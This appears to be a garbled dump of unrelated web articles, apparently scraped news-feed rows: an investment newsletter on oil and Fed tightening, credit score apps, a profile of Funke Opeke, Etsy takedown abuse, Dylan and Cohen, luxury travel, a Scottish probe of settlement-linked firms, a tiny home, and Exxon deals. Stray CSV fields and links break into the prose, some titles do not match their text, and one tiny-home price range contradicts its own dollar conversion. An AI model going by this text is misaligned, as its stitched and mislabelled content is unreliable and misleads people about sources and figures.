For the 2020s the book is not written yet but my base case is towards tighter oil supply and decent energy sector performance. It might not be a “boom” like in the 2000s but rather a long grind from low valuations with high dividend payouts accumulating over time while higher-valuation stocks sag a bit.

Portfolio Updates

I have several investment accounts and I provide updates on my asset allocation and investment selections for some of the portfolios in each newsletter issue every six weeks.

These portfolios include the model portfolio account specifically for this newsletter and my relatively passive indexed retirement account. Members of my premium research service also have access to three additional model portfolios and my other holdings with more frequent updates.

I use a free account at Personal Capital to easily keep track of all my accounts and monitor my net worth.

M1 Finance Newsletter Portfolio

I started this account in September 2018 with $10k of new capital and I put new money in regularly. Currently I put in $1000 per month.

It’s one of my smallest accounts but the goal is for the portfolio to be accessible and to show newsletter readers my best representation of where I think value is in the market. It’s a low-turnover multi-asset globally diversified portfolio that focuses on liquid investments and is scalable to virtually any size.

I chose M1 Finance because their platform is commission-free and allows for a combo of ETF and individual stock selection with automatic and/or manual rebalancing. It makes for a great model portfolio with high flexibility. (See my disclosure policy here regarding my affiliation with M1.)

And here’s the breakdown of the holdings in those slices:

Changes since the previous issue:

I increased MSTR compared to MARA in the digital assets pie and made other small tweaks to holdings.

Other Model Portfolios and Accounts

I have three other real-money model portfolios that I share within my premium research service including:

Fortress Income Portfolio

ETF-Only Portfolio

No Limits Portfolio

Plus I have larger personal accounts at Fidelity and Schwab and I share those within the service as well.

Final Thoughts: Entering a Tightening Cycle

Many emerging market central banks have been tightening monetary conditions throughout 2021.

For some examples Brazil raised their short-term interest rates from 2% to 9.25% and Russia raised theirs from 4.25% to 7.5%. Even some developed market central banks have already tightened a bit including Canada that stopped quantitative easing this autumn Australia that ended its yield curve control and Japan that slowed down their balance sheet expansion.

The US Federal Reserve and the European Central Bank have been among the most dovish of central banks during the past couple of years but the Fed is next in line now that it is slowly reducing its rate of quantitative easing.

If you look back decades in US stock market history stocks generally did quite well whenever the Fed was tightening monetary policy with interest rate increases. It’s not that rate hikes are good for stocks; it’s that the Fed hikes rates when the economy is strengthening and that strengthening economy is also good for stocks. It’s kind of like how shark attacks and ice cream consumption have a pretty close correlation… because they both have an uptick in summer.

The outcome changes if you narrow the analysis period to the time after the global financial crisis starting around 2010 or so. Whenever the Fed held its balance sheet flat and whenever the federal government was not actively stimulating stocks generally chopped along sideways. Their upward periods were quite correlated with either monetary or fiscal stimulus occurring.

S&P 500 quarter-over-quarter revenue growth is decelerating and operating margins are rolling over a bit. This chart from Charlie Bilello provides a great two-decade visual:

After such a strong year for equities in 2021 amid major fiscal and monetary stimulus my base case is for a less-spectacular 2022. That doesn’t necessarily mean I am expecting a big crash but simply that the combination of high valuations declining margins from high levels and withdrawing stimulus leads me to think somewhat defensively as far as the major indices are concerned.

I continue to like several stock sectors and industries such as healthcare energy and homebuilders. There are plenty of places to deploy capital for investors that have a long-term view.

My preference is towards companies with strong balance sheets and substantial economic resilience along with some TIPS international equities and various alternative investments.

According to a recent survey of 410 Americans about 30% of respondents reported not knowing their credit score. Since one's credit score is a determinant of eligibility for many financial products ranging from auto loans to mortgages to credit cards it is worrisome that almost a third of people aren't actively monitoring their credit score. To help you stay on top of your credit score we've found the best apps to help you keep track. The best part is that using these methods to check your credit score does not negatively affect your credit.

Not happy with your score? There are a number of relatively simple changes you can apply to your spending habits to help improve it.

Consumer favorite

Credit Karma

Usage of Credit Karma (CK) has really exploded after it entered the market many years ago. Users will receive credit reports from TransUnion and Equifax (2 of the major credit bureaus) completely free. CK will then use its data to make financial product offers to users such as credit cards or personal loans. The financial institutions selling these financial products are the entities paying CK. Their app provides alerts for any sudden changes in your credit score and you can even send a dispute to the credit bureau directly from the app.

For everyone

CreditWise

Capital One developed this app for everyone not just its own customers. The app will provide you a weekly report of your VantageScore 3.0 from TransUnion. VantageScore is different from the more familiar FICO score but takes very similar inputs so your VantageScore should move in the same patterns as your FICO score. CreditWise also provides a simulator that shows you how certain actions like paying down debt could affect your credit score.

The standard

myFICO

The FICO score has been generally known as the standard for consumer credit reports. However while the app is free you need a subscription to FICO which starts at $29.95 per month. After a subscription you'll see your FICO score from all three credit bureaus along with how it has changed over time. Push notifications will tell you if anything changes. Though there is a hefty price tag the subscription and app will provide you all you need to know about your credit picture.

Straight from the bureau

Experian

Experian is one of the larger international credit bureaus and will provide you a full picture of your credit score on a monthly basis if you subscribe to its service. Experian will also help you examine what may be hurting your credit score and how to take actions to recover. The downside is that you only receive the report from Experian just one of the three major bureaus.

Ease of use

Credit Sesame

Credit Sesame provides free of charge a great visual layout with simple to read charts to understand your credit picture and how to improve it. Every month you'll receive an updated VantageScore from TransUnion and tips on how to better manage your credit.

All in one

Mint

While it has been mostly known as a personal finance and budgeting tool Mint also added a feature several years ago that allows you to get a credit score summary from Equifax. The app helps you understand your credit card usage payment history inquiries and more so that you have a full picture of your credit finances.

Get graded

Credit.com

Credit.com provides you an Experian score and a Vantagescore 3.0 at no cost. Neither of these are official FICO scores but again they are close and move in the same direction. Additionally you'll get graded (A-F) on several different aspects of your credit management: payment history debt usage inquiries and more.

Another bureau

TransUnion

TransUnion one of the three major bureaus provides an app that provides users a proprietary score. Like the other bureaus this score is not the same as a FICO score but is a good proxy.

Get your score

Discover Credit Scorecard

Discover cardholders can log in through the app to view a free monthly FICO score. There are also educational tools to show you how various factors are affecting your score.

Your credit journey

Chase Mobile®

Chase customers will be able to access their Chase Credit Journey information via the mobile banking app. Chase Credit Journey will provide a free VantageScore alerts weekly updates and a simulator to help you manage your credit.

Banking on the go

Wells Fargo Mobile

Similar to Chase above Wells Fargo will provide free access to a FICO score for customers. Customers can see this score along with all their other banking deals on the Wells Fargo Mobile app.",,,,,,,,,,,,

While it is Equinix first investment in Africa it Funke Opeke’s last laugh on an idea many people thought was crazy in the beginning.

Born in 1961 to father Lawrence Kayode Opeke who was the first Nigerian Director of the Cocoa Research Institute of Nigeria and her mother a retired teacher who headed several catholic private schools Olufunke Olayemi Opeke grew up in Ibadan the capital of Oyo state although she is a native of Ile- Oluji Ondo state in Nigeria.

Opeke finished her secondary school at Queens School Ibadan Oyo state and obtained a Bachelor’s and master’s degree in Electrical Engineering from Obafemi Awolowo University and Columbia University respectively. She often talks about being the only female student in her engineering classes which is not far from the truth as it is in many Nigerian universities where the engineering faculty is dominated by men.

She began her career in Information and Communication Technology (ICT) in the United States as an executive director with Verizon Communications’ wholesale division in New York City after graduating from Columbia University.

After 20 years working in U.S. telecoms Funke Opeke returned to Nigeria in 2005 to take on the role of Chief Technology Officer of MTN Nigeria.

When she noticed the low internet connectivity in Nigeria creating a solution seemed unachievable and too ambitious but not for Opeke as she turned her engineer’s eye towards the ocean raised $240 million in funding and laid 4400 miles of fiber optic cable from Nigeria to Portugal and started what we all know today as MainOne West Africa’s leading communications services and network solutions provider.

This brought in big business as it created an estimated 800+ business-to-business customers including major international technology enterprises social media companies global telecommunications operators financial service companies and cloud service providers.

Nigeria’s Internet presence which was long mostly linked with scams is now a thriving place for foreign commercial opportunities thanks to Opeke.

The MainOne Chief was named one of the World’s Top 50 Women in Tech by Forbes in 2018 for her efforts in sparking internet adoption and was also recently named one of the Top 10 Women to Watch in the Data Center Industry by Data Centre Magazine.

She credits Fola Adeola founder of Guaranty Trust Bank (GTB) as a mentor being the first person she met with her idea of MainOne and has supported her ever since even though he initially thought she was overly ambitious in terms of what she was setting out to do. According to Ms. Opeke Fola Adeola’s support gave credibility to the MainOne brand at its inception.

“I am not overly sensitive I just do what needs to get done. I cannot apologize for being a woman it is who I am”- Funke Opeke.",,,,,,,,,,,,

ETSY,Etsy,https://news.google.com/articles/CBMiVmh0dHBzOi8vbnlwb3N0LmNvbS8yMDIxLzEyLzEyL2V0c3ktY3JhZnQtc2VsbGVycy1zYXktdGhleXJlLXVuZmFpcmx5LWVsYm93ZWQtb2ZmLXNpdGUv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Christmas smear: Etsy craft sellers say they're unfairly elbowed off site,"Competition is getting fiercer on Etsy — and some sellers of handcrafted knickknacks jewelry and home furnishings are accusing their rivals of dirty tactics.

Over the past month Elyza Davis has racked up 43000 “likes” for a viral TikTok post in which she claimed a competitor had shut down her Etsy shop ScorpioMoonRising abruptly halting sales of her witchcraft-themed holiday ornaments by falsely claiming that she had violated a copyright.

Davis said the competing seller who runs the Etsy store MimAndTheAnvil had a trademark registration for “fairy orbs” that she claims had nothing to do with her $8 to $12 “spell balls” — which are filled with herbs charms and other witchcraft-themed ephemera.

“I find this frustrating not just from the perspective of one small business attacking another” Davis told The Post. “This has happened during the holiday season — meaning that my product has less time to sell before the USPS shipping cutoff date for Christmas.”.

3 Elyza Davis fought to reinstate her ornament sales on Etsy.

Etsy yanked Davis’s ornaments on Nov. 9 and she wasn’t able to relist them until Nov. 24. The seller who initiated the complaint against Davis declined to comment citing “upcoming legal proceedings” in an e-mail to The Post.

Etsy’s “take-down notices” for sellers of homemade toys clothing and furniture jumped 60 percent in 2020 the most recent data available to more than 54000 according to the company’s Web site. The takedowns spike around Thanksgiving and Christmas and “it’s typically competitors trying to slow down someone else” according to Brent Sausser a partner at law firm Sausser Summers PC which represents sellers in such disputes.

For its part Etsy appears to be complying strictly with the Digital Millennium Copyright Act or DMCA — which can result in taking down sellers’ items on a single unsubstantiated complaint. The problem Sausser says is that Etsy is effectively relying on the “honor system” taking the “word of the person who submits the infringement complaint.” Sausser said sites like Etsy do little — if anything — to vet complaints but they’re quick to remove targeted listings.

Asked by The Post for comment Etsy said that “abusive notices or other misuse” of the policy could result in a seller’s termination on the site. It declined to comment further.

Complaints of poor policing abound. One seller who listed an owl keychain saw it removed after a complaint claimed it violated a “Harry Potter” copyright.

“It is indeed an owl keychain — and there is indeed an owl in Harry Potter — but that’s where the similarity ends” the seller said. “I looked at my listings/tags and there is no mention of Harry Potter in there at all.”

The owl complaint purportedly came from a representative of “Harry Potter” distributor WarnerMedia. But another seller who had also been flagged claimed on Reddit that reps for the entertainment giant said they hadn’t filed the Etsy complaints. WarnerMedia reps couldn’t be reached for comment.

Meanwhile sellers targeted by the bogus claims say they have tried in vain to get help from Etsy.

“They literally have zero seller support” said one Reddit user who also was shut down by the fake Warner account. “They don’t have chat phone and they NEVER answer the ‘e-mail’ feature.”

Filing a copyright-infringement claim on Etsy requires no proof aside from a signed attestation of the claim’s truthfulness. The complainer fills out a three-page form including links to the offending merchandise. Targeted sellers can file a counterclaim and if the other seller doesn’t respond with a lawsuit within 10 days the items can be reinstated.

But Etsy can also withhold revenue from the targeted seller’s sales for up to 90 days if it considers the seller a “risk” according to letters Etsy sends sellers that were obtained by The Post.

Another Etsy seller who received a takedown notice shortly before Black Friday Mona Weiss said “The infringement process is very one-sided.” Weiss got slapped with a complaint alleging that she was infringing on a copyright for decorated animal skulls despite the fact that at least a dozen other sellers are offering similar items on Etsy.

Even more frustrating she said the complaint didn’t list a copyright. Weiss who runs Laughing Skull Studio in Ohio said she searched the federal copyright database and came up with nothing.

“Anyone can file an allegation” Weiss said. “I believe the seller wanted to knock me out of the game for Black Friday.”

It’s not just Etsy. Chris McCabe a former Amazon executive who’s now an e-commerce consultant said the take-down requests are a “common practice” on the site of the Seattle-based e-tailing giant and are sometimes sent from fake e-mail accounts.

One of McCabe’s clients who sells on Amazon lost more than $1 million in sales due to a bogus copyright complaint — and another seller was attacked with such complaints 14 times he said.

“These complaints are usually competitor abuse” McCabe told The Post. “It’s the allegations that matter and Amazon is afraid to be accused of not protecting trademark rights.”",https://news.google.com/articles/CBMiPmh0dHBzOi8vd3d3LmRvbWluby5jb20vY29udGVudC9ldHN5LTE5NzBzLWxpZ2h0aW5nLXRyZW5kLTIwMjIv0gEA?hl=en-US&gl=US&ceid=US%3Aen,According to Etsy's New Trend Report Seventies Statement Lighting Will Take Over 2022,"We may earn revenue from the products available on this page and participate in affiliate programs.

It was a landmark moment when Bob Dylan was awarded the Nobel Prize for Literature in 2016. He became the first lyricist to win the coveted award in over a hundred years and Leonard Cohen believed nobody was more deserving of the decoration than Dylan.

Only a handful of musicians could have potentially won the prestigious award and the late Leonard Cohen is undoubtedly one of them. Elegant wordsmithery came freely to the Canadian artist and his background originated in poetry before he dived into music later in life.

While Cohen was Dylan’s elder in a biological sense musically the freewheelin’ troubadour was his forefather helping to break the ground that made his diversion from poetry to music a straightforward one. For this reason there was no animosity from the Canadian that he was overlooked for the Nobel Prize and in his eyes there wasn’t a more worthy winner.

“To me [the award] is like pinning a medal on Mount Everest for being the highest mountain” Cohen once told fans during a Q+A in support of his final album You Want It Darker.

During the same conversation Cohen brought up Dylan again when he discussed his approach to songwriting. “I think that Bob Dylan knows this more than all of us: you don’t write the songs anyhow” he said. “So if you’re lucky you can keep the vehicle healthy and responsive over the years.

“If you’re lucky your own intentions have very little to do with this. You can keep the body as well-oiled and receptive as possible but whether you’re actually going to be able to go for the long haul is really not your own choice.”

The duo shared vast appreciation for each other. While Cohen referred to his peer as the “Mount Everest” of music Dylan has also waxed lyrical about his contemporary in an equally superlative manner. “When people talk about Leonard they fail to mention his melodies which to me along with his lyrics are his greatest genius” Dylan once said. “Even the counterpoint lines—they give a celestial character and melodic lift to every one of his songs.”

He added “I see no disenchantment in Leonard’s lyrics at all. There’s always a direct sentiment as if he’s holding a conversation and telling you something him doing all the talking but the listener keeps listening.”

Dylan is renowned for being a challenging customer to please as was Cohen during his lifetime; however the terms they discuss one another’s work shows that their respective greatness was something they both agreed on.",,,,,,,,,,,,

Hancock Holiday Nights Illuminates the Shaker Village

HANCOCK Mass. — Hancock Shaker Village has illuminated the spirit of its former occupants with a winter light show that blends the old with the new.

For the month of December guests can enjoy artistic light installations and festive decorations at the 19th century New England community. As an added bonus visitors can say hello to donkeys sheep and cows in the Round Stone Barn.



This is new programming for the oldest Shaker village in New England and the hope is to make it a regular tradition. The event has attracted an average of about 150 people per day.



""We built the event with the hopes that we would keep building it and building it and building it I'll tell you from the minute we shared information about it I think within 20 minutes we had our first ticket purchase"" Director of Communications & Marketing Carolyn McDaniel said.



""I think people were excited to be able to come here and they wanted to come here at night they don't get that opportunity to that often.""



Artist Joe Wheaton has created projection artwork for the experience that gives a modern take on the Shakers' deep-rooted traditions. His pieces are featured on the inside and outside of the Round Stone Barn and on an additional barn.



Through a vision board Wheaton and staff members created an interesting and artistic take on the Shaker’s history putting a modern twist on historic images.



Guests begin at the timber frame which is decorated with holiday trees that can be personalized with wishes. Down a lantern-lit walkway is an illuminated garden tool shed and the poultry house which is a nod to the Shakers’ holiday traditions.



In the poultry house is a staged ""selfie"" area where a 19th-century holiday photo can be taken in front of a fireplace.



Tickets can be purchased here.",,,,,,,,,

Globally-minded and social media-inspired Millennials and Gen Z aren't just overtaking the luxury market but the travel industry as well. Photo / 123rf

Hear the word ""luxury"" and it's hard for our mind not to jump to the quintessential images of grandeur; silver service restaurants and first-class tickets white fluffy bathrobes and expensive shopping sprees. Days dedicated to nothing but being pampered into a state of bliss.

Defined as an ""inessential desirable state that is expensive or difficult to obtain"" luxury has long been the raison d'être for many a traveller. Born during the early 1900s leisure travel involved wealthy Americans hopping aboard fantastically lavish passenger ships bound for Europe as a sign of status.

We've come a long way since those opulent streamliners and the truth is that as travellers tastes and trends have changed so has the definition of ""luxury"".

Spurred along by cheap flights and Instagram brags Millennials and Gen Z travel more than any previous group. Photo / 123rf

Historically the lavishness of a trip was determined by objects (think crystal glasses of fine wine or penthouse suites with priceless views). However a new generation of jet setters and their particular values are changing the luxury travel industry from one marked by expensive extravagance to personalised experiences that are purpose-led ethical and enriching.

Cast an eye over the luxury market and you may be surprised to see it catering to a large percentage of Millennials. The 2019 Luxury Goods Worldwide Market Study reports that millennials account for 35 per cent of the luxury market; a number that will grow to 45 per cent by 2025. They aren't the only ones to watch either with the same study estimating Gen-Zers to hold 40 per cent of the market by 2025.

Globally-minded and social media-inspired Millennials and Gen Z aren't just overtaking the luxury market but the travel industry as well. Spurred along by cheap flights and Instagram brags these generations travel more (when lockdown restrictions allow) than any previous group meaning their values and aspirations hold key insights for how luxury travel will develop in coming years.

Luxury is…Customised

While buying a house or owning a car were the ultimate symbols of freedom and maturity for generations gone by the youth of today now consider travel to be the primary aspiration. The trips they take are often seen as an extension of their own identity.

It then makes sense that luxury has become less about objects anyone can purchase but customised one-of-a-kind experiences that reflect one's unique identity.

Travel companies like Carrier Untold Story Travel and Abercrombie & Kent all report an increased demand for personalised itineraries that focus on a person's individual interests or purposes.

Luxury is…Purpose-led

Just a few years ago luxury travel was largely defined by lavish locations like the fashion-forward streets of Milan or sun-drenched islands of Mykonos. Now as we increasingly use travel to express and explore our identity luxury travel has matured from ""where"" to the ""why""; the purpose that lies beneath the journey.

Anna Guillan AM a consultant at Kerzner International explains: ""the shift from developed destinations manufactured experiences lavishness and opulence has moved to authentic local regional and crafted."" She describes how this shift is driven by travellers' fundamental desire to create experiences that are authentic enriching and fulfilling.

Luxury is…Ethical

From their trendy canvas bags and organic cotton clothes to reusable keep cups and electric cars it's no secret Gen Z and Millennials prioritise sustainability and social responsibility when it comes to spending cash.

This is no different when it comes to their luxury travel.A 2020 study by Expedia Group Outlook found Gen Z travellers were the demographic most likely to consider sustainability when travelling (67 per cent) and prioritise travel businesses with environmentally friendly practices.

Make no mistake young travellers still want luxurious experiences and plush comforts they just want to enjoy them with a clear conscience too.

A recent study found that 86% of 18 to 29-year-olds valued sustainable travel options when it came to booking a trip. Photo / 123rf

Luxury is…Wellness

If you weren't fussed on juice cleanses organic cooking classes yoga retreats and meditation resorts chances are these health-enhancing experiences have become pretty attractive after months of lockdowns and virus scares.

However the relationship between wealth and wellness has been trending for a few years already. A complete 180 from previous centuries where indulgence and relaxation were the height of extravagance we now see luxury holidays as a way to invest in our health and wellbeing. Leading international hospitality groups like SBE have reported a ""significant rise"" in demand for health and wellness services across the globe.

The relationship between wealth and wellness was already trending a few years before the pandemic. Photo / 123rf

Luxury is…Off the Grid

Born or raised with a phone in their hand Millennials and Gen Z are likely to find the presence of technology in their life not just helpful but exhausting.

Tech is not solely a set of helpful tools and platforms but also as a thing to be escaped from time to time. An attitude that increasingly sees digital detoxes marketed as the ultimate form of indulgence.

While just a few years ago flashy digital devices were a mark of luxury and status abroad the constant presence of phones and screens in daily life has made 'unplugging' an aspirational luxury not everyone can afford.

According to a recent UK study 42 per cent of consumers see rest and recharging as a top priority for post-Covid holidays while a third express a desire to escape the noise of daily life and reconnect with nature something everyone regardless of age can no doubt sympathise with as we reach the end of 2021.",https://news.google.com/articles/CBMiXWh0dHBzOi8vd3d3LmRhaWx5cmVjb3JkLmNvLnVrL25ld3Mvc2NvdHRpc2gtbmV3cy9zY290dGlzaC1nb3Zlcm5tZW50LW1ha2UtY2FzaC1wcm9iZS0yNTY3NTQ3OdIBYWh0dHBzOi8vd3d3LmRhaWx5cmVjb3JkLmNvLnVrL25ld3Mvc2NvdHRpc2gtbmV3cy9zY290dGlzaC1nb3Zlcm5tZW50LW1ha2UtY2FzaC1wcm9iZS0yNTY3NTQ3OS5hbXA?hl=en-US&gl=US&ceid=US%3Aen,Taxpayer cash probe over money handed to companies linked to illegal Israeli settlements,"Something went wrong please try again later.

The Scottish Government is investigating whether public money has been handed to companies with links to “illegal” Israeli ­settlements in Palestine.

The UN human rights office issued a report last year naming 112 firms it said were linked to building programmes in the occupied West Bank.

The blacklist includes Airbnb Booking.com Expedia Group and Motorola Solutions.

The Palestinians have hailed the report a “victory for international law” but Israel reacted furiously calling it “shameful”.

And now moves are under way to check what links Scotland has to those companies.

Business minister Ivan McKee has said he will investigate whether any of them have received public money or support in Scotland and then write to any identified to demand an update on their operations in Palestine.

The commitment came in response to a parliamentary question from Greens MSP Ross Greer.

He asked the Scottish Government if it would bar the firms ­identified by the UN from getting support.

McKee responded: “I have asked officials to write to the chief executives of relevant public bodies to remind them of the policy guidance make them aware of this UN list and ask them to provide information to ­officials on any relationships they have with companies on this list.

“Following this I will write to any companies thus identified seeking an update on their ­activities in the Occupied ­Palestinian Territories and what they are doing to cease those specific activities – as identified by the ­independent international fact-finding mission which ­provided the basis for their inclusion in this list.”

About 600000 people live in 140 settlements built since Israel’s occupation of the West Bank and East Jerusalem in 1967. The settlements are ­considered illegal under international law though Israel has always disputed this.

The Palestinians have long called for the removal of the settlements arguing that they challenge their claim for an independent state.

Scottish Greens external affairs spokesperson Greer said: ­“Scotland’s ­commitment to uphold and defend human rights must be demonstrated by actions not just words.

“That’s especially true when there is a clear breach of international law like the illegal Israeli occupation of Palestinian land and the rampant abuse of Palestinian people by illegal settlers.

“It has now been made clear to Scottish public bodies that they should not be complicit with this illegal occupation.

“We must stand up for the basic rights of all Palestinian people.”

The UN report came after four years of work and listed companies supplying equipment and materials or providing services such as banking facilities that were aiding the ­demolition of Palestinian properties or construction of new settlements.

Playland’s Castaway Cove in Ocean City is on its way to rebuilding the arcade destroyed in a raging Jan 30 fire. The city’s Planning Board gave the official go-ahead this week for some improvements to the new building.

The owner of the Boardwalk amusement park architects and engineers have worked throughout the year to bring back the popular attraction that serves as an entryway into Playland.

Pilings and other foundation work have been done over recent months. Steel pilings and concrete planks are laying the groundwork for a new arcade.

And returning by popular demand is Playland’s iconic pirate ship that had greeted customers entering the amusement park since 1998 but was destroyed in the fire.

“The No. 1 question was about the pirate ship — whether I was downtown selling tickets or people asking on Facebook or email” Brian Hartley vice president of Playland’s Castaway Cove explained in an interview Saturday.

He continued “People wanted the pirate ship back. It was a big thing to incorporate back. It was something that really evolved over time into a landmark. We never considered until now that it meant so much to so many people.”

There were no injuries in the fire and the majority of rides weren’t touched by the flames.

On Wednesday the city’s Planning Board unanimously approved Playland’s plan to add extra space for storage and office space on the second floor of the arcade building among other things that required variances. The footprint of the project is the same.

“They were really great to work with” Hartley said of the Planning Board. “They put together a subcommittee first so the meeting was really a formality.”

Meanwhile the pirate ship may return to its place atop the arcade at the end of the summer of 2022.

And there is something else exciting that may be in store for the amusement park patrons who have made Playland’s Castaway Cove a family tradition for generations Hartley said.

Hartley and Scott Simpson the owner of Playland had a new vision for the park prior to the fire.

“Our long-term plan before the fire happened was to add some sort of attraction. We will continue to explore that option” Hartley said. “We would like some sort of ride a monorail a roller coaster something that will definitely add thrills.”

In addition to the arcade Dairy Queen operated by Playland and tenants Hamburger Construction Company and Brume Juice were destroyed in the same building.

Hartley noted that the owner of Hamburger Construction Company has retired leaving an opening for a new tenant. Playland will open a Dairy Queen there again.

During the summer of 2021 visitors walked through an easement at Jilly’s an adjacent Boardwalk business to enter Playland. Hartley hopes that even if the arcade is not completed by next summer patrons will be able to use the same easement to enter and exit the park.

“That is something that will have to be determined later” he added.

A timeline is not so precise when it comes to weather-dependent work and delivery of construction materials during the COVID-19 pandemic he stressed. He said the city has been very supportive of Playland during the ordeal.

“We hope that the arcade is rebuilt by the summer” he said. “The best-case scenario is looking like maybe late August but it will depend on the plans the weather and if we get all the games.”

Either way Hartley said Playland’s Castaway Cove will offer as it did in 2021 and the 60-plus years before hours of family fun with an array of rides and excitement.

Fritz Tiny Home is here to show that if you’re to spend a small fortune on a tiny it might as well be a fully custom incredibly gorgeous unit.

Fritz Tiny Home is a Canadian company that first made headlines with its flagship product also called the Fritz Tiny Home and introduced earlier this year. The follow-up is just as gorgeous albeit more custom and slightly larger the Trahan – a virtual yoga studio slash permanent residence on wheels with style to spare.The appeal of tiny homes lies in the fact that they promise comfortable living in a very compact footprint reduced running costs and the possibility of relocating at will. This promised sense of freedom is more often than not strong enough to override the obvious disadvantages of downsizing and the prohibitive cost of such a unit. However if you do have money to invest you might as well go fully custom and this way make sure those disadvantages disappear into thin air.This is what Heather and Kevin Fritz have done with the Trahan a unit that was designed with input from the owner an at-home yoga instructor who shares the space with her partner. The Trahan offers accommodation for two in a structure that is just 32 feet (9.7 meters) long and sits on a triple-axle trailer. It’s slightly larger than its predecessor and the extra space was used to integrate two separate areas for working out – a micro-gym if you will.Entrance is through large sliding glass doors straight into the living room which also doubles as the owner’s yoga studio. The Trahan combines elements of A-frame cabins and mid-century modern mansions and this becomes obvious right away with the large A-frame panoramic window at the end. Right next to it is a custom green velvet couch whose legs have been cut off so it could receive a wooden base that hides storage. The yoga “studio” photos show means some space free of clutter to spread the mat while the owner does online classes.The dining area is situated centrally and doubles as an office. The “desk” (or table if this space is used for dining by the couple) incorporates storage and air ventilation. When the couple is entertaining a larger party a fold-out table and chairs for six are hidden in the storage area under the sofa.The kitchen is almost life-size with concrete countertops and white cabinetry which in combination with the large windows throughout offer a sense of a much larger space. There’s a life-size refrigerator a four-burner stove and oven a large sink and a suspended microwave that hides the extractor. Other spaces in this tiny might be downsized but this kitchen is anything but.The bathroom and the micro-gym are located at the other end under the loft that serves as bedroom. The “gym” means room for a Peloton bike and some shelving for towels weights and other small workout gear. For maximum headroom the ceiling right above the stationary bike is coffered walnut ceiling; the two large windows are meant to create the impression that you’re riding your bike outside.The bathroom is equally impressive for the way the designers were able to make the most out of the available space . The dry toilet features an RV-style hookup and there’s also a small sink with vanity. The standing shower features a gorgeous walnut base created on a CNC router and sealed with an epoxy pour. A washer / dryer combo and extra storage are also available.The bedroom is accessible through a storage-integrated ladder and features a landing that allows standing. The loft is mostly occupied by a queen-size bed but there’s storage on each side and the large lateral windows provide cross-ventilation as well as prevent the sensation that you’re in a cramped space.The Trahan comes with underfloor heating and extra ventilation through a Blauberg Vento ERV system. It is not fitted for off-grid living  boasting instead 30-amp power and standard RV sewer connection but like with most tinies this could probably be done for an interested party at an extra cost.Offering a total living space of 362 square feet (34 square meters) the Trahan is wrapped in black metal and Douglas fir and insulated for the cold Canadian winters. The interior is also wood Douglas fir milled by one of the designers which adds to the impression that this is a modern-day cabin.Since the Trahan is a custom build Fritz Tiny Home doesn’t offer pricing on it. But don’t expect it to be cheap : this Canadian maker usually charges between CAD $16500 and $225000 (US$130000 and $177000 at the current exchange rate) for a base unit without customization and off-grid capabilities. No one said that living intentionally is cheap.",https://news.google.com/articles/CBMiXGh0dHBzOi8vd3d3LmJ1enpmZWVkLmNvbS9hYmJ5a2Fzcy9ob21lLXByb2R1Y3RzLXRoYXQtbWF5LXRyaWNrLXBlb3BsZS1pbnRvLXRoaW5raW5nLXlvdS1oYXZl0gEA?hl=en-US&gl=US&ceid=US%3Aen,44 Home Products To Make It Look Like Your Life's Together,"BTW — Sweet Water Decor is a woman-owned small biz that specializes in hand-lettered items and beautiful home decor!

Irving-based energy giant ExxonMobil recently announced it acquired green energy support company Materia for an undisclosed amount.

Materia was founded in 1999 out of the laboratories at the California Institute of Technology by Professor Robert Grubbs. In 2005 Grubbs was awarded the Nobel Prize in chemistry for his development of new chemical bonding processes. The company now focuses on developing polymer technology with commercial applications. Materia is based in Pasadena California and has a manufacturing facility in Huntsville.

According to a prepared statement by Exxon both companies have been working together since 2017 to develop new hydrocarbon-based materials to strengthen their renewable energy infrastructure capabilities. New developments with Materia can improve green infrastructure such as wind turbines by making materials lighter and stronger.

“We are reimagining how new hydrocarbon-based materials can form the building blocks to help multiple industries achieve a more sustainable future” said Karen McKee president of ExxonMobil Chemical Company a subsidiary of ExxonMobil. “This acquisition ties together Materia’s Nobel Prize-winning technology with ExxonMobil’s complementary proprietary technology and world-class manufacturing capabilities to bring this exciting new class of structural materials to commercial scale.”

Exxon’s partnership and later acquisition of Materia further emphasize Exxon’s commitment to reduce greenhouse gas emissions by 15 to 20 percent by 2025. Part of Exxon’s plan to reduce greenhouse gasses also includes investment in new technologies and the adoption of efficient manufacturing practices.

“The combination of Materia’s innovative culture dedicated employees and cutting-edge technology with ExxonMobil’s expertise and scale in bringing new technology to market will open up an exciting new chapter for Materia” Grubbs said in a prepared statement. “ExxonMobil’s acquisition significantly expands the growth opportunities for this unique technology.”",https://news.google.com/articles/CBMiQmh0dHBzOi8vd3d3Lm5ld2FyYWIuY29tL25ld3MvZXh4b25tb2JpbC1xYXRhci1zaWduLWN5cHJ1cy1nYXMtZGVhbNIBRmh0dHBzOi8vd3d3Lm5ld2FyYWIuY29tL25ld3MvZXh4b25tb2JpbC1xYXRhci1zaWduLWN5cHJ1cy1nYXMtZGVhbD9hbXA?hl=en-US&gl=US&ceid=US%3Aen,ExxonMobil Qatar sign Cyprus gas deal,"US giant ExxonMobil and Qatar Energy signed a contract Friday for oil and gas exploration and production-sharing off the divided island of Cyprus despite Turkey’s opposition to the deal.

Cypriot Energy Minister Natasa Pilides Varnavas Theodosiou CEO of ExxonMobil Cyprus and Ali al-Mana director of Qatar Energy’s International Upstream and Exploration signed the contract in Nicosia.

It is the second gas exploration contract that the consortium has signed for Block 5 in the island's Exclusive Economic Zone (EEZ).

In February 2019 the consortium discovered a huge natural gas reserve off Cyprus in Block 10 the island’s largest find to date holding an estimated five to eight trillion cubic feet.

The consortium plans to drill an appraisal well on Block 10 in late December with results expected by the end of February.

Oil and gas drilling off Cyprus has been interrupted by the Covid-19 pandemic.

""Despite the increasingly difficult working environment for the global oil and gas industry today we are taking a decisive step towards enhancing our mutually beneficial partnership"" Pilides said at Friday’s signing ceremony.

RELATED The militarisation of Cyprus' new regional diplomacy Analysis

Asked about Turkey’s negative reaction to the licensing of Block 5 Pilides said: ""We proceed based on international law and the Law of the Sea; this has always been our principle.""

Fieldwork on Block 5 will begin in the second half of 2022 she said.

Turkey has threatened to prevent ExxonMobil’s search for oil and gas off Cyprus after Nicosia awarded it the rights to Block 5.

Last week the Turkish foreign ministry said a sector of the licensed area violates Turkey’s continental shelf in the eastern Mediterranean.

""Turkey will never allow any foreign country company or ship to engage in hydrocarbon exploration activities in its maritime jurisdictions"" the ministry said.

Ankara would ""defend"" its rights and those of the Turkish Republic of Northern Cyprus it said.

The breakaway TRNC recognised only by Ankara lays claim to energy resources discovered off its coast insisting the island’s natural resources belong to both communities.

The eastern Mediterranean has become an energy hot spot with significant natural gas finds for Cyprus Israel and Egypt.

